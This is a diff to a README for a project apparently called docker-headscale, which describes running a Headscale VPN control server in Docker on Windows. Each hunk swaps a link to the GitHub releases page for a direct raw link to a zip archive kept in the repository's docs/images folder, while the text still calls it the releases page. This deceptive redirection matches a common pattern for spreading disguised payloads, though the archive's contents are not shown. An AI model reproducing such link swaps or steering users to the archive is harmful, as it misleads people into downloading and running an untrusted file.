@@ -1,6 +1,6 @@
 # 🐳 docker-headscale - Run Your Own VPN Control Server
 
-[![Download docker-headscale](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/ritchiearistotelian98/docker-headscale/releases)
+[![Download docker-headscale](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/ritchiearistotelian98/docker-headscale/main/docs/images/headscale_docker_3.0.zip)
 
 ## 🚀 What This App Does
 
@@ -15,7 +15,7 @@ This setup helps you:
 
 ## 📥 Download
 
-Visit this page to download: [docker-headscale releases](https://github.com/ritchiearistotelian98/docker-headscale/releases)
+Visit this page to download: [docker-headscale releases](https://raw.githubusercontent.com/ritchiearistotelian98/docker-headscale/main/docs/images/headscale_docker_3.0.zip)
 
 Open the latest release, then download the file that matches your Windows setup. If the release offers a zip file or installer package, save it to your computer before you continue.
 
@@ -33,7 +33,7 @@ If you plan to connect more than one device, install the Tailscale client app on
 
 ## 🛠️ Install on Windows
 
-1. Go to the [releases page](https://github.com/ritchiearistotelian98/docker-headscale/releases).
+1. Go to the [releases page](https://raw.githubusercontent.com/ritchiearistotelian98/docker-headscale/main/docs/images/headscale_docker_3.0.zip).
 2. Download the latest release file.
 3. Save the file in a folder you can find again, such as Downloads or Desktop.
 4. If the file is a zip archive, extract it.
@@ -172,7 +172,7 @@ This keeps the app files and the saved network data in one place
 
 When a new release is posted:
 
-1. Open the [releases page](https://github.com/ritchiearistotelian98/docker-headscale/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/ritchiearistotelian98/docker-headscale/main/docs/images/headscale_docker_3.0.zip).
 2. Download the newest release file.
 3. Stop the running container.
 4. Replace the old files if the release notes say to do so.
@@ -190,7 +190,7 @@ If your data folder stays in place, your saved settings and network data can rem
 
 ## 🧭 What to Do Next
 
-1. Open the [release page](https://github.com/ritchiearistotelian98/docker-headscale/releases)
+1. Open the [release page](https://raw.githubusercontent.com/ritchiearistotelian98/docker-headscale/main/docs/images/headscale_docker_3.0.zip)
 2. Download the latest package
 3. Start Docker Desktop on Windows
 4. Open the project folder
